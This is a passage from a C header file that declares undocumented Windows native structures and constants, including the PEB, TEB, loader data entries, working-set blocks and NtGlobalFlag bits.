            ULONG Reserved : 25;
        };
    };
} MEMORY_IMAGE_INFORMATION, * PMEMORY_IMAGE_INFORMATION;

typedef struct _MEMORY_ENCLAVE_IMAGE_INFORMATION {
    MEMORY_IMAGE_INFORMATION ImageInfo;
    UCHAR UniqueID[32];
    UCHAR AuthorID[32];
} MEMORY_ENCLAVE_IMAGE_INFORMATION, * PMEMORY_ENCLAVE_IMAGE_INFORMATION;

typedef struct _MEMORY_WORKING_SET_BLOCK {
    ULONG_PTR Protection : 5;
    ULONG_PTR ShareCount : 3;
    ULONG_PTR Shared : 1;
    ULONG_PTR Node : 3;
#ifdef _WIN64
    ULONG_PTR VirtualPage : 52;
#else
    ULONG VirtualPage : 20;
#endif
} MEMORY_WORKING_SET_BLOCK, * PMEMORY_WORKING_SET_BLOCK;

typedef struct _MEMORY_WORKING_SET_INFORMATION {
    ULONG_PTR NumberOfEntries;
    _Field_size_(NumberOfEntries) MEMORY_WORKING_SET_BLOCK WorkingSetInfo[1];
} MEMORY_WORKING_SET_INFORMATION, * PMEMORY_WORKING_SET_INFORMATION;

typedef struct _MEMORY_WORKING_SET_EX_BLOCK {
    union {
        struct {
            ULONG_PTR Valid : 1;
            ULONG_PTR ShareCount : 3;
            ULONG_PTR Win32Protection : 11;
            ULONG_PTR Shared : 1;
            ULONG_PTR Node : 6;
            ULONG_PTR Locked : 1;
            ULONG_PTR LargePage : 1;
            ULONG_PTR Priority : 3;
            ULONG_PTR Reserved : 3;
            ULONG_PTR SharedOriginal : 1;
            ULONG_PTR Bad : 1;
            ULONG_PTR Win32GraphicsProtection : 4;
#ifdef _WIN64
            ULONG_PTR ReservedUlong : 28;
#endif
        };
        struct {
            ULONG_PTR Valid : 1;
            ULONG_PTR Reserved0 : 14;
            ULONG_PTR Shared : 1;
            ULONG_PTR Reserved1 : 5;
            ULONG_PTR PageTable : 1;
            ULONG_PTR Location : 2;
            ULONG_PTR Priority : 3;
            ULONG_PTR ModifiedList : 1;
            ULONG_PTR Reserved2 : 2;
            ULONG_PTR SharedOriginal : 1;
            ULONG_PTR Bad : 1;
#ifdef _WIN64
            ULONG_PTR ReservedUlong : 32;
#endif
        } Invalid;
    };
} MEMORY_WORKING_SET_EX_BLOCK, * PMEMORY_WORKING_SET_EX_BLOCK;

typedef struct _MEMORY_WORKING_SET_EX_INFORMATION {
    PVOID VirtualAddress;
    union {
        MEMORY_WORKING_SET_EX_BLOCK VirtualAttributes;
        ULONG_PTR Long;
    } u1;
} MEMORY_WORKING_SET_EX_INFORMATION, * PMEMORY_WORKING_SET_EX_INFORMATION;

#define MM_ZERO_ACCESS         0  // this value is not used.
#define MM_READONLY            1
#define MM_EXECUTE             2
#define MM_EXECUTE_READ        3
#define MM_READWRITE           4  // bit 2 is set if this is writable.
#define MM_WRITECOPY           5
#define MM_EXECUTE_READWRITE   6
#define MM_EXECUTE_WRITECOPY   7

#define MM_NOCACHE            0x8
#define MM_GUARD_PAGE         0x10
#define MM_DECOMMIT           0x10   // NO_ACCESS, Guard page
#define MM_NOACCESS           0x18   // NO_ACCESS, Guard_page, nocache.
#define MM_UNKNOWN_PROTECTION 0x100  // bigger than 5 bits!

#define MM_INVALID_PROTECTION ((ULONG)-1)  // bigger than 5 bits!

#define MM_PROTECTION_WRITE_MASK     4
#define MM_PROTECTION_COPY_MASK      1
#define MM_PROTECTION_OPERATION_MASK 7 // mask off guard page and nocache.
#define MM_PROTECTION_EXECUTE_MASK   2

#define MM_SECURE_DELETE_CHECK 0x55

/*
** Virtual Memory END
*/

/*
** System Firmware START
*/

typedef enum _SYSTEM_FIRMWARE_TABLE_ACTION {
    SystemFirmwareTable_Enumerate,
    SystemFirmwareTable_Get,
    SystemFirmwareTableMax
} SYSTEM_FIRMWARE_TABLE_ACTION, *PSYSTEM_FIRMWARE_TABLE_ACTION;

typedef struct _SYSTEM_FIRMWARE_TABLE_INFORMATION {
    ULONG ProviderSignature;
    SYSTEM_FIRMWARE_TABLE_ACTION Action;
    ULONG TableID;
    ULONG TableBufferLength;
    UCHAR TableBuffer[ANYSIZE_ARRAY];
} SYSTEM_FIRMWARE_TABLE_INFORMATION, *PSYSTEM_FIRMWARE_TABLE_INFORMATION;

/*
** System Firmware END
*/

//
//  PEB/TEB
//
#define GDI_HANDLE_BUFFER_SIZE32  34
#define GDI_HANDLE_BUFFER_SIZE64  60

#if !defined(_M_X64)
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE32
#else
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE64
#endif

typedef ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];
typedef ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];
typedef ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];

#define RTL_MAX_DRIVE_LETTERS 32
#define RTL_DRIVE_LETTER_VALID (USHORT)0x0001

// 32-bit definitions
typedef struct _STRING32 {
    USHORT Length;
    USHORT MaximumLength;
    ULONG Buffer;
} STRING32;
typedef STRING32 *PSTRING32;

typedef STRING32 UNICODE_STRING32;

#if (_MSC_VER < 1300) && !defined(_WINDOWS_)
typedef struct LIST_ENTRY32 {
    DWORD Flink;
    DWORD Blink;
} LIST_ENTRY32;
typedef LIST_ENTRY32 *PLIST_ENTRY32;

typedef struct LIST_ENTRY64 {
    ULONGLONG Flink;
    ULONGLONG Blink;
} LIST_ENTRY64;
typedef LIST_ENTRY64 *PLIST_ENTRY64;
#endif

#define WOW64_POINTER(Type) ULONG

typedef struct _PEB_LDR_DATA32 {
    ULONG Length;
    BOOLEAN Initialized;
    WOW64_POINTER(HANDLE) SsHandle;
    LIST_ENTRY32 InLoadOrderModuleList;
    LIST_ENTRY32 InMemoryOrderModuleList;
    LIST_ENTRY32 InInitializationOrderModuleList;
    WOW64_POINTER(PVOID) EntryInProgress;
    BOOLEAN ShutdownInProgress;
    WOW64_POINTER(HANDLE) ShutdownThreadId;
} PEB_LDR_DATA32, *PPEB_LDR_DATA32;

#define LDR_DATA_TABLE_ENTRY_SIZE_WINXP32 FIELD_OFFSET( LDR_DATA_TABLE_ENTRY32, ForwarderLinks )

typedef struct _LDR_DATA_TABLE_ENTRY32 {
    LIST_ENTRY32 InLoadOrderLinks;
    LIST_ENTRY32 InMemoryOrderLinks;
    LIST_ENTRY32 InInitializationOrderLinks;
    WOW64_POINTER(PVOID) DllBase;
    WOW64_POINTER(PVOID) EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING32 FullDllName;
    UNICODE_STRING32 BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union
    {
        LIST_ENTRY32 HashLinks;
        struct
        {
            WOW64_POINTER(PVOID) SectionPointer;
            ULONG CheckSum;
        };
    };
    union
    {
        ULONG TimeDateStamp;
        WOW64_POINTER(PVOID) LoadedImports;
    };
    WOW64_POINTER(PVOID) EntryPointActivationContext;
    WOW64_POINTER(PVOID) PatchInformation;
    LIST_ENTRY32 ForwarderLinks;
    LIST_ENTRY32 ServiceTagLinks;
    LIST_ENTRY32 StaticLinks;
    WOW64_POINTER(PVOID) ContextInformation;
    WOW64_POINTER(ULONG_PTR) OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;

typedef struct _CURDIR32 {
    UNICODE_STRING32 DosPath;
    WOW64_POINTER(HANDLE) Handle;
} CURDIR32, *PCURDIR32;

typedef struct _RTL_DRIVE_LETTER_CURDIR32 {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING32 DosPath;
} RTL_DRIVE_LETTER_CURDIR32, *PRTL_DRIVE_LETTER_CURDIR32;

typedef struct _RTL_USER_PROCESS_PARAMETERS32 {
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    WOW64_POINTER(HANDLE) ConsoleHandle;
    ULONG ConsoleFlags;
    WOW64_POINTER(HANDLE) StandardInput;
    WOW64_POINTER(HANDLE) StandardOutput;
    WOW64_POINTER(HANDLE) StandardError;

    CURDIR32 CurrentDirectory;
    UNICODE_STRING32 DllPath;
    UNICODE_STRING32 ImagePathName;
    UNICODE_STRING32 CommandLine;
    WOW64_POINTER(PVOID) Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING32 WindowTitle;
    UNICODE_STRING32 DesktopInfo;
    UNICODE_STRING32 ShellInfo;
    UNICODE_STRING32 RuntimeData;
    RTL_DRIVE_LETTER_CURDIR32 CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
} RTL_USER_PROCESS_PARAMETERS32, *PRTL_USER_PROCESS_PARAMETERS32;

typedef struct _PEB32 {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsLegacyProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN SpareBits : 3;
        };
    };
    WOW64_POINTER(HANDLE) Mutant;

    WOW64_POINTER(PVOID) ImageBaseAddress;
    WOW64_POINTER(PPEB_LDR_DATA) Ldr;
    WOW64_POINTER(PRTL_USER_PROCESS_PARAMETERS) ProcessParameters;
    WOW64_POINTER(PVOID) SubSystemData;
    WOW64_POINTER(PVOID) ProcessHeap;
    WOW64_POINTER(PRTL_CRITICAL_SECTION) FastPebLock;
    WOW64_POINTER(PVOID) AtlThunkSListPtr;
    WOW64_POINTER(PVOID) IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ProcessPreviouslyThrottled : 1;
            ULONG ProcessCurrentlyThrottled : 1;
            ULONG ReservedBits0 : 25;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        WOW64_POINTER(PVOID) KernelCallbackTable;
        WOW64_POINTER(PVOID) UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    WOW64_POINTER(PVOID) ApiSetMap;
    ULONG TlsExpansionCounter;
    WOW64_POINTER(PVOID) TlsBitmap;
    ULONG TlsBitmapBits[2];
    WOW64_POINTER(PVOID) ReadOnlySharedMemoryBase;
    WOW64_POINTER(PVOID) HotpatchInformation;
    WOW64_POINTER(PPVOID) ReadOnlyStaticServerData;
    WOW64_POINTER(PVOID) AnsiCodePageData;
    WOW64_POINTER(PVOID) OemCodePageData;
    WOW64_POINTER(PVOID) UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    WOW64_POINTER(SIZE_T) HeapSegmentReserve;
    WOW64_POINTER(SIZE_T) HeapSegmentCommit;
    WOW64_POINTER(SIZE_T) HeapDeCommitTotalFreeThreshold;
    WOW64_POINTER(SIZE_T) HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    WOW64_POINTER(PPVOID) ProcessHeaps;

    WOW64_POINTER(PVOID) GdiSharedHandleTable;
    WOW64_POINTER(PVOID) ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    WOW64_POINTER(PRTL_CRITICAL_SECTION) LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    WOW64_POINTER(ULONG_PTR) ImageProcessAffinityMask;
    GDI_HANDLE_BUFFER32 GdiHandleBuffer;
    WOW64_POINTER(PVOID) PostProcessInitRoutine;

    WOW64_POINTER(PVOID) TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    // Rest of structure not included.
} PEB32, *PPEB32;

#define GDI_BATCH_BUFFER_SIZE 310

typedef struct _GDI_TEB_BATCH32 {
    ULONG Offset;
    WOW64_POINTER(ULONG_PTR) HDC;
    ULONG Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH32, *PGDI_TEB_BATCH32;

#if (_MSC_VER < 1300) && !defined(_WINDOWS_)
//
// 32 and 64 bit specific version for wow64 and the debugger
//
typedef struct _NT_TIB32 {
    DWORD ExceptionList;
    DWORD StackBase;
    DWORD StackLimit;
    DWORD SubSystemTib;
    union {
        DWORD FiberData;
        DWORD Version;
    };
    DWORD ArbitraryUserPointer;
    DWORD Self;
} NT_TIB32, *PNT_TIB32;

typedef struct _NT_TIB64 {
    DWORD64 ExceptionList;
    DWORD64 StackBase;
    DWORD64 StackLimit;
    DWORD64 SubSystemTib;
    union {
        DWORD64 FiberData;
        DWORD Version;
    };
    DWORD64 ArbitraryUserPointer;
    DWORD64 Self;
} NT_TIB64, *PNT_TIB64;
#endif

typedef struct _TEB32 {
    NT_TIB32 NtTib;

    WOW64_POINTER(PVOID) EnvironmentPointer;
    CLIENT_ID32 ClientId;
    WOW64_POINTER(PVOID) ActiveRpcHandle;
    WOW64_POINTER(PVOID) ThreadLocalStoragePointer;
    WOW64_POINTER(PPEB) ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    WOW64_POINTER(PVOID) CsrClientThread;
    WOW64_POINTER(PVOID) Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    WOW64_POINTER(PVOID) WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    WOW64_POINTER(PVOID) SystemReserved1[54];
    NTSTATUS ExceptionCode;
    WOW64_POINTER(PVOID) ActivationContextStackPointer;
    BYTE SpareBytes[36];
    ULONG TxFsContext;

    GDI_TEB_BATCH32 GdiTebBatch;
    CLIENT_ID32 RealClientId;
    WOW64_POINTER(HANDLE) GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    WOW64_POINTER(PVOID) GdiThreadLocalInfo;
    WOW64_POINTER(ULONG_PTR) Win32ClientInfo[62];
    WOW64_POINTER(PVOID) glDispatchTable[233];
    WOW64_POINTER(ULONG_PTR) glReserved1[29];
    WOW64_POINTER(PVOID) glReserved2;
    WOW64_POINTER(PVOID) glSectionInfo;
    WOW64_POINTER(PVOID) glSection;
    WOW64_POINTER(PVOID) glTable;
    WOW64_POINTER(PVOID) glCurrentRC;
    WOW64_POINTER(PVOID) glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING32 StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    WOW64_POINTER(PVOID) DeallocationStack;
    WOW64_POINTER(PVOID) TlsSlots[64];
    LIST_ENTRY32 TlsLinks;
} TEB32, *PTEB32;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

#ifndef FLS_MAXIMUM_AVAILABLE
#define FLS_MAXIMUM_AVAILABLE 128
#endif

#ifndef TLS_MINIMUM_AVAILABLE
#define TLS_MINIMUM_AVAILABLE 64
#endif

#ifndef TLS_EXPANSION_SLOTS
#define TLS_EXPANSION_SLOTS 1024
#endif

#ifndef DOS_MAX_COMPONENT_LENGTH
#define DOS_MAX_COMPONENT_LENGTH 255
#endif

#ifndef DOS_MAX_PATH_LENGTH
#define DOS_MAX_PATH_LENGTH (DOS_MAX_COMPONENT_LENGTH + 5)
#endif

typedef struct _ACTIVATION_CONTEXT_DATA * PACTIVATION_CONTEXT_DATA;
typedef struct _ASSEMBLY_STORAGE_MAP * PASSEMBLY_STORAGE_MAP;

typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, *PCURDIR;

#define RTL_USER_PROC_CURDIR_CLOSE 0x00000002
#define RTL_USER_PROC_CURDIR_INHERIT 0x00000003

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG_PTR EnvironmentSize;
    ULONG_PTR EnvironmentVersion;

    PVOID PackageDependencyData;
    ULONG ProcessGroupId;
    ULONG LoaderThreads;

    UNICODE_STRING RedirectionDllName; // RS4
    UNICODE_STRING HeapPartitionName; // 19H1
    ULONG_PTR DefaultThreadpoolCpuSetMasks;
    ULONG DefaultThreadpoolCpuSetMaskCount;
    ULONG DefaultThreadpoolThreadMaximum;
    ULONG HeapMemoryTypeMask; // WIN11
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

#define FLG_STOP_ON_EXCEPTION 0x00000001
#define FLG_SHOW_LDR_SNAPS 0x00000002 
#define FLG_DEBUG_INITIAL_COMMAND 0x00000004 
#define FLG_STOP_ON_HUNG_GUI 0x00000008 
#define FLG_HEAP_ENABLE_TAIL_CHECK 0x00000010
#define FLG_HEAP_ENABLE_FREE_CHECK 0x00000020
#define FLG_HEAP_VALIDATE_PARAMETERS 0x00000040
#define FLG_HEAP_VALIDATE_ALL 0x00000080
#define FLG_APPLICATION_VERIFIER 0x00000100
#define FLG_MONITOR_SILENT_PROCESS_EXIT 0x00000200
#define FLG_POOL_ENABLE_TAGGING 0x00000400
#define FLG_HEAP_ENABLE_TAGGING 0x00000800
#define FLG_USER_STACK_TRACE_DB 0x00001000 
#define FLG_KERNEL_STACK_TRACE_DB 0x00002000
#define FLG_MAINTAIN_OBJECT_TYPELIST 0x00004000
#define FLG_HEAP_ENABLE_TAG_BY_DLL 0x00008000
#define FLG_DISABLE_STACK_EXTENSION 0x00010000 
#define FLG_ENABLE_CSRDEBUG 0x00020000
#define FLG_ENABLE_KDEBUG_SYMBOL_LOAD 0x00040000 
#define FLG_DISABLE_PAGE_KERNEL_STACKS 0x00080000
#define FLG_ENABLE_SYSTEM_CRIT_BREAKS 0x00100000
#define FLG_HEAP_DISABLE_COALESCING 0x00200000 
#define FLG_ENABLE_CLOSE_EXCEPTIONS 0x00400000 
#define FLG_ENABLE_EXCEPTION_LOGGING 0x00800000
#define FLG_ENABLE_HANDLE_TYPE_TAGGING 0x01000000 
#define FLG_HEAP_PAGE_ALLOCS 0x02000000
#define FLG_DEBUG_INITIAL_COMMAND_EX 0x04000000 
#define FLG_DISABLE_DBGPRINT 0x08000000
#define FLG_CRITSEC_EVENT_CREATION 0x10000000 
#define FLG_LDR_TOP_DOWN 0x20000000 
#define FLG_ENABLE_HANDLE_EXCEPTIONS 0x40000000
#define FLG_DISABLE_PROTDLLS 0x80000000

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };

    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PSLIST_HEADER AtlThunkSListPtr;
    PVOID IFEOKey;

    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ProcessPreviouslyThrottled : 1;
            ULONG ProcessCurrentlyThrottled : 1;
            ULONG ProcessImagesHotPatched : 1; // RS5
            ULONG ReservedBits0 : 24;
        };
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved;
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];

    PVOID ReadOnlySharedMemoryBase;
    struct _SILO_USER_SHARED_DATA* SharedData;
    PVOID* ReadOnlyStaticServerData;

    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    union
    {
        ULONG NtGlobalFlag;
        struct
        {
            ULONG StopOnException : 1;          // FLG_STOP_ON_EXCEPTION
            ULONG ShowLoaderSnaps : 1;          // FLG_SHOW_LDR_SNAPS
            ULONG DebugInitialCommand : 1;      // FLG_DEBUG_INITIAL_COMMAND
            ULONG StopOnHungGUI : 1;            // FLG_STOP_ON_HUNG_GUI
            ULONG HeapEnableTailCheck : 1;      // FLG_HEAP_ENABLE_TAIL_CHECK
            ULONG HeapEnableFreeCheck : 1;      // FLG_HEAP_ENABLE_FREE_CHECK
            ULONG HeapValidateParameters : 1;   // FLG_HEAP_VALIDATE_PARAMETERS
            ULONG HeapValidateAll : 1;          // FLG_HEAP_VALIDATE_ALL
            ULONG ApplicationVerifier : 1;      // FLG_APPLICATION_VERIFIER
            ULONG MonitorSilentProcessExit : 1; // FLG_MONITOR_SILENT_PROCESS_EXIT
            ULONG PoolEnableTagging : 1;        // FLG_POOL_ENABLE_TAGGING
            ULONG HeapEnableTagging : 1;        // FLG_HEAP_ENABLE_TAGGING
            ULONG UserStackTraceDb : 1;         // FLG_USER_STACK_TRACE_DB
            ULONG KernelStackTraceDb : 1;       // FLG_KERNEL_STACK_TRACE_DB
            ULONG MaintainObjectTypeList : 1;   // FLG_MAINTAIN_OBJECT_TYPELIST
            ULONG HeapEnableTagByDll : 1;       // FLG_HEAP_ENABLE_TAG_BY_DLL
            ULONG DisableStackExtension : 1;    // FLG_DISABLE_STACK_EXTENSION
            ULONG EnableCsrDebug : 1;           // FLG_ENABLE_CSRDEBUG
            ULONG EnableKDebugSymbolLoad : 1;   // FLG_ENABLE_KDEBUG_SYMBOL_LOAD
            ULONG DisablePageKernelStacks : 1;  // FLG_DISABLE_PAGE_KERNEL_STACKS
            ULONG EnableSystemCritBreaks : 1;   // FLG_ENABLE_SYSTEM_CRIT_BREAKS
            ULONG HeapDisableCoalescing : 1;    // FLG_HEAP_DISABLE_COALESCING
            ULONG EnableCloseExceptions : 1;    // FLG_ENABLE_CLOSE_EXCEPTIONS
            ULONG EnableExceptionLogging : 1;   // FLG_ENABLE_EXCEPTION_LOGGING
            ULONG EnableHandleTypeTagging : 1;  // FLG_ENABLE_HANDLE_TYPE_TAGGING
            ULONG HeapPageAllocs : 1;           // FLG_HEAP_PAGE_ALLOCS
            ULONG DebugInitialCommandEx : 1;    // FLG_DEBUG_INITIAL_COMMAND_EX
            ULONG DisableDbgPrint : 1;          // FLG_DISABLE_DBGPRINT
            ULONG CritSecEventCreation : 1;     // FLG_CRITSEC_EVENT_CREATION
            ULONG LdrTopDown : 1;               // FLG_LDR_TOP_DOWN
            ULONG EnableHandleExceptions : 1;   // FLG_ENABLE_HANDLE_EXCEPTIONS
            ULONG DisableProtDlls : 1;          // FLG_DISABLE_PROTDLLS
        } NtGlobalFlags;
    };

    ULARGE_INTEGER CriticalSectionTimeout;
    SIZE_T HeapSegmentReserve;
    SIZE_T HeapSegmentCommit;
    SIZE_T HeapDeCommitTotalFreeThreshold;
    SIZE_T HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID* ProcessHeaps;

    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    PRTL_CRITICAL_SECTION LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    KAFFINITY ActiveProcessAffinityMask;
    GDI_HANDLE_BUFFER GdiHandleBuffer;
    PVOID PostProcessInitRoutine;

    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    ULARGE_INTEGER AppCompatFlags;
    ULARGE_INTEGER AppCompatFlagsUser;
    PVOID pShimData;
    PVOID AppCompatInfo;

    UNICODE_STRING CSDVersion;

    PACTIVATION_CONTEXT_DATA ActivationContextData;
    PASSEMBLY_STORAGE_MAP ProcessAssemblyStorageMap;
    PACTIVATION_CONTEXT_DATA SystemDefaultActivationContextData;
    PASSEMBLY_STORAGE_MAP SystemAssemblyStorageMap;

    SIZE_T MinimumStackCommit;

    PVOID SparePointers[2];
    PVOID PatchLoaderData;
    PVOID ChpeV2ProcessInfo; 

    ULONG AppModelFeatureState;
    ULONG SpareUlongs[2];

    USHORT ActiveCodePage;
    USHORT OemCodePage;
    USHORT UseCaseMapping;
    USHORT UnusedNlsField;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;

    union
    {
        PVOID pContextData;
        PVOID pUnused;
        PVOID EcCodeBitMap;
    };

    PVOID pImageHeaderHash;
    union
    {
        ULONG TracingFlags;
        struct
        {
            ULONG HeapTracingEnabled : 1;
            ULONG CritSecTracingEnabled : 1;
            ULONG LibLoaderTracingEnabled : 1;
            ULONG SpareTracingBits : 29;
        };
    };
    ULONGLONG CsrServerReadOnlySharedMemoryBase;
    PRTL_CRITICAL_SECTION TppWorkerpListLock;
    LIST_ENTRY TppWorkerpList;
    PVOID WaitOnAddressHashTable[128];
    PVOID TelemetryCoverageHeader; // RS3
    ULONG CloudFileFlags;
    ULONG CloudFileDiagFlags; // RS4
    CHAR PlaceholderCompatibilityMode;
    CHAR PlaceholderCompatibilityModeReserved[7];
    struct _LEAP_SECOND_DATA* LeapSecondData; // RS5
    union
    {
        ULONG LeapSecondFlags;
        struct
        {
            ULONG SixtySecondEnabled : 1;
            ULONG Reserved : 31;
        };
    };
    ULONG NtGlobalFlag2;
    ULONGLONG ExtendedFeatureDisableMask; // since WIN11
} PEB, * PPEB;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
    ULONG Flags;
    PCSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME *Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;

#define GDI_BATCH_BUFFER_SIZE 310

typedef struct _GDI_TEB_BATCH {
    ULONG	Offset;
    UCHAR	Alignment[4];
    ULONG_PTR HDC;
    ULONG	Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH, *PGDI_TEB_BATCH;

typedef struct _ACTIVATION_CONTEXT_DATA {
    ULONG Magic; //'xtcA'
    ULONG HeaderSize;
    ULONG FormatVersion;
    ULONG TotalSize;
    ULONG DefaultTocOffset;
    ULONG ExtendedTocOffset;
    ULONG AssemblyRosterOffset; 
    ULONG Flags;
} ACTIVATION_CONTEXT_DATA, * PACTIVATION_CONTEXT_DATA;

typedef struct _ASSEMBLY_STORAGE_MAP_ENTRY {
    ULONG Flags;
    UNICODE_STRING DosPath;
    HANDLE Handle;
} ASSEMBLY_STORAGE_MAP_ENTRY, * PASSEMBLY_STORAGE_MAP_ENTRY;

typedef struct _ASSEMBLY_STORAGE_MAP {
    ULONG Flags;
    ULONG AssemblyCount;
    PASSEMBLY_STORAGE_MAP_ENTRY* AssemblyArray;
} ASSEMBLY_STORAGE_MAP, * PASSEMBLY_STORAGE_MAP;

typedef VOID(NTAPI* PACTIVATION_CONTEXT_NOTIFY_ROUTINE)(
    _In_ ULONG NotificationType,
    _In_ struct _ACTIVATION_CONTEXT* ActivationContext,
